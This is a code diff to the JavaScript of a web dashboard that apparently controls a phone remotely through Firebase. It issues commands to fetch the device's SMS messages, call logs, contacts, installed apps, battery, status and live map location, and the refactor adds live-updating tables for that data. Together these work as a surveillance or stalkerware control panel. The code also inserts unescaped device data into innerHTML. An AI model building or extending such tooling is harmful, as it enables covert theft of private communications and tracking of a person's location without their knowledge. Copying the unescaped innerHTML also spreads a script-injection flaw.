@@ -154,7 +154,8 @@ import {
   set,
   onValue,
   onChildAdded,
-  get
+  get,
+  onChildRemoved
 } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
 import {
   getAuth,
@@ -188,13 +189,13 @@ onAuthStateChanged(auth, (user) => {
     uid = user.uid;
     dashboardInitialized = true;
     initializeDashboard();
-    initialCommands(); // send data fetch commands on auth
+    initialCommands();
   } else if (!user) {
     window.location.href = "login.html";
   }
 });
 
-// ✅ Global sendCommand function
+// ✅ Send Command to Firebase
 function sendCommand(section, commandValue) {
   const user = auth.currentUser;
   if (!user) return console.warn("User not authenticated");
@@ -206,13 +207,13 @@ function sendCommand(section, commandValue) {
     .catch(err => console.error("❌ Command Error:", err));
 }
 
+// ✅ Main Dashboard Setup
 function initializeDashboard() {
   document.getElementById("logoutBtn")?.addEventListener("click", () => {
     signOut(auth).then(() => window.location.href = "index.html");
   });
 
-  // Initialize map
-  map = L.map('map', { zoomControl: true }).setView([21.4505, 80.2048], 14);
+  map = L.map('map').setView([21.4505, 80.2048], 14);
   liveMarker = L.marker([21.4505, 80.2048]).addTo(map);
 
   L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
@@ -220,7 +221,7 @@ function initializeDashboard() {
     maxZoom: 19
   }).addTo(map);
 
-  // Real-time data listener
+  // ✅ Live Device Status
   const userRef = ref(db, `users/${uid}`);
   onValue(userRef, (snapshot) => {
     const data = snapshot.val();
@@ -260,9 +261,55 @@ function initializeDashboard() {
       });
   }
 
+  // ✅ Reusable fetch + listener for live update
+  function setupLiveList(section, tableId, mapFn) {
+    const listRef = ref(db, `users/${uid}/${section}`);
+    const tbody = document.getElementById(tableId);
+    tbody.innerHTML = "";
+
+    // Clear and refill on every new data
+    onValue(listRef, (snapshot) => {
+      tbody.innerHTML = "";
+      snapshot.forEach(snap => {
+        const item = snap.val();
+        const row = document.createElement("tr");
+        row.innerHTML = mapFn(item);
+        tbody.appendChild(row);
+      });
+    });
+  }
+
+  // ✅ Event Listeners
+  document.getElementById("btnInstalledApps")?.addEventListener("click", () => {
+    showSection("installedApps");
+    setupLiveList("installedApps", "appsTableBody", app => `<td>${app.name}</td><td>${app.package}</td>`);
+    sendCommand("installedApps", "getInstalledApps");
+  });
+
+  document.getElementById("btnCallLogs")?.addEventListener("click", () => {
+    showSection("callLogs");
+    setupLiveList("calls", "callTableBody", log => {
+      const time = log.time ? new Date(log.time).toLocaleString() : "N/A";
+      return `<td>${log.name || "-"}</td><td>${log.number || "-"}</td><td>${log.type || "-"}</td><td>${log.duration || "-"}s</td><td>${time}</td>`;
+    });
+    sendCommand("calls", "getCallLogs");
+  });
+
+  document.getElementById("btnContacts")?.addEventListener("click", () => {
+    showSection("contactLogs");
+    setupLiveList("contacts", "contactTableBody", c => `<td>${c.name || "-"}</td><td>${c.number || "-"}</td>`);
+    sendCommand("contacts", "getContacts");
+  });
+
+  document.getElementById("smsBtn")?.addEventListener("click", () => {
+    showSection("smsLogs");
+    setupLiveList("sms", "smsTableBody", sms => `<td>${sms.from || "Unknown"}</td><td>${sms.message || ""}</td><td>${new Date(sms.timestamp || Date.now()).toLocaleString()}</td>`);
+    sendCommand("sms", "getSmsLogs");
+  });
+
   document.querySelectorAll("#trackLocation").forEach(btn => {
     btn.addEventListener("click", () => {
-      document.querySelector("#status").style.display = "flex";
+      showSection("status");
       displayNoneDashboard();
       sendCommand('location', 'getLocation');
       setTimeout(() => map.invalidateSize(), 300);
@@ -278,50 +325,16 @@ function initializeDashboard() {
     });
   });
 
-  const fetchData = (path, tbodyId, mapFn) => {
-    const refPath = ref(db, `users/${uid}/${path}`);
-    const tbody = document.getElementById(tbodyId);
-    tbody.innerHTML = "";
-    get(refPath).then(snapshot => {
-      if (!snapshot.exists()) return;
-      snapshot.forEach(snap => tbody.innerHTML += mapFn(snap.val()));
-      showSection(path);
-    });
-  };
-
-  document.getElementById("btnInstalledApps")?.addEventListener("click", () => {
-    fetchData("installedApps", "appsTableBody", app => `<tr><td>${app.name}</td><td>${app.package}</td></tr>`);
-    sendCommand("installedApps", "getInstalledApps");
-  });
-
-  document.getElementById("btnCallLogs")?.addEventListener("click", () => {
-    fetchData("calls", "callTableBody", log => {
-      const time = log.time ? new Date(log.time).toLocaleString() : "N/A";
-      return `<tr><td>${log.name || "-"}</td><td>${log.number || "-"}</td><td>${log.type || "-"}</td><td>${log.duration || "-"}s</td><td>${time}</td></tr>`;
-    });
-    sendCommand("calls", "getCallLogs");
-  });
-
-  document.getElementById("btnContacts")?.addEventListener("click", () => {
-    fetchData("contacts", "contactTableBody", c => `<tr><td>${c.name || "-"}</td><td>${c.number || "-"}</td></tr>`);
-    sendCommand("contacts", "getContacts");
-  });
-
-  document.getElementById("smsBtn")?.addEventListener("click", () => {
-    document.getElementById("smsLogs").style.display = "block";
-    displayNoneDashboard();
-    sendCommand("sms", "getSmsLogs");
-  });
-
-  onChildAdded(ref(db, `users/${uid}/sms`), (smsSnap) => {
-    const sms = smsSnap.val();
-    const tbody = document.getElementById("smsTableBody");
-    const tr = document.createElement("tr");
-    tr.innerHTML = `<td>${sms.from || "Unknown"}</td><td>${sms.message || ""}</td><td>${new Date(sms.timestamp || Date.now()).toLocaleString()}</td>`;
-    tbody.appendChild(tr);
-  });
-
   document.getElementById("refreshSiteBtn")?.addEventListener("click", () => location.reload());
+}
+
+// ✅ Dashboard Section Toggle
+function showSection(sectionId) {
+  const sections = ["status", "installedApps", "callLogs", "contactLogs", "smsLogs"];
+  sections.forEach(id => {
+    const section = document.getElementById(id);
+    if (section) section.style.display = id === sectionId ? "block" : "none";
+  });
 }
 
 function displayNoneDashboard() {
@@ -332,7 +345,7 @@ function displayBlockDashboard() {
   document.getElementById("dashboardMain").style.display = "block";
 }
 
-// ✅ Send initial commands
+// ✅ Initial Commands on Login
 function initialCommands() {
   sendCommand("status", "getStatus");
   sendCommand("battery", "getBattery");
